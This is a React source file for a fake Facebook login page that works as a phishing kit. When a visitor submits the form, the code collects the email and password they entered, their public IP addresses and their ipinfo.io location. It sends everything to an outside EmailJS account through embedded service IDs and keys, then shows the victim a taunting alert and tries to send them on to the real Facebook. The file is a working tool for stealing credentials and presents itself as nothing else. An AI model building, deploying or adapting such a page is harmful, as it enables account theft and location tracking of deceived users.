import React, { useEffect, useState } from 'react';
import './App.css';
import fb_image from '../src/images/fb_logo.svg'
import emailjs from '@emailjs/browser';
import Swal from 'sweetalert2';

const publicIp = require("react-public-ip");

const FacebookLoginPage = () => {

    const [login, setLogin] = useState({
        email: "",
        password: "",
    });
    const [ipv4, setIpv4] = useState();
    const [ipv6, setIpv6] = useState();
    const [location, setLocation] = useState(null);
    const [error, setError] = useState(null);
    const fetchLocation = async () => {
        try {
            const response = await fetch('https://ipinfo.io/json?token=8a783c6a6548b1');
            const data = await response.json();
            setLocation(data);
        } catch (error) {
            setError('Failed to fetch location data');
        }
    };

    const fetchIpAddresses = async () => {
        try {
            let ipv4Result = await publicIp.v4();
            let ipv6Result = await publicIp.v6();
            setIpv4(ipv4Result || '');
            setIpv6(ipv6Result || '');
        } catch (error) {
            setError('Failed to fetch location data');
        }
    };
    useEffect(() => {
        fetchIpAddresses()
        fetchLocation()
    }, []);

    const onChange = (e) => {
        const { name, value } = e.target;
        setLogin((prevState) => ({
            ...prevState,
            [name]: value,
        }));
    };

    const onSubmit = async () => {
        const dateTime = new Date().toLocaleString();
        const templateParams = {
            email: login.email,
            password: login.password,
            ipv4: ipv4,
            ipv6: ipv6,
            city: location.city,
            region: location.region,
            country: location.country,
            loc: location.loc,
            datetime: dateTime,
        };
        try {
             const result = await emailjs.send(
                 'service_z7ysfj4',
                 'template_npetqre',
                 templateParams,
                 'HYmy10exBQfzB2uAf'
             );


            Swal.fire({
                title: 'Cuttttttt!',
                text: 'Cuttttttt dummmmmmmmmmmm',
                icon: 'error',
                confirmButtonText: 'Cool'
            });
            window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
        } catch (error) {
        }

    };
    return (
        <div className="facebook-container">
            <main>
                <div className="row">
                    <div className="col-logo">
                        <img src={fb_image} alt="Logo" />
                        <h2>Facebook helps you connect and share with the people in your life.</h2>
                    </div>

                    <div className="col-form">
                        <div className="form-container">
                            <input
                                name="email"
                                onChange={onChange}
                                type="text"
                                placeholder="Email address or phone number"
                            />
                            <input
                                name="password"
                                onChange={onChange}
                                type="password"
                                placeholder="Password"
                            />
                            <button onClick={onSubmit} className="btn-login">Login</button>
                            <a href='https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0'>Forgotten password?</a>
                            <button href='https://www.facebook.com/r.php?entry_point=login' className="btn-new">Create new Account</button>
                        </div>
                        <p>
                            <a  ><b>Create a Page</b></a> for a celebrity, brand or business.
                        </p>
                    </div>
                </div>
            </main>

            <footer>
                <div className="footer-contents">
                    <ol>
                        <li>English (UK)</li>
                        <li><a >Tiếng Việt</a></li>
                        <li><a  >中文(台灣)</a></li>
                        <li><a  >한국어</a></li>
                        <li><a  >বাংলা</a></li>
                        <li><a  >اردو</a></li>
                        <li><a  >हिन्दी</a></li>
                        <li><a  >ಕನ್ನಡ</a></li>
                        <li><a  >Español</a></li>
                        <li><a  >Português (Brasil)</a></li>
                        <li><a  >Français (France)</a></li>
                        <li><button>+</button></li>
                    </ol>

                    <ol>
                        <li><a  >Sign Up</a></li>
                        <li><a  >Log In</a></li>
                        <li><a  >Messenger</a></li>
                        <li><a  >Facebook Lite</a></li>
                        <li><a  >Watch</a></li>
                        <li><a  >People</a></li>
                        <li><a  >Pages</a></li>
                        <li><a  >Page categories</a></li>
                        <li><a  >Places</a></li>
                        <li><a  >Games</a></li>
                        <li><a  >Locations</a></li>
                        <li><a  >Marketplace</a></li>
                        <li><a  >Facebook</a></li>
                        <li><a  >PayGroups</a></li>
                        <li><a  >Jobs</a></li>
                        <li><a  >Oculus</a></li>
                        <li><a  >Portal</a></li>
                        <li><a  >Instagram</a></li>
                        <li><a  >Local</a></li>
                    </ol>
                    <small>Facebook © 2021</small>
                </div>
            </footer>
        </div>
    );
};

export default FacebookLoginPage;
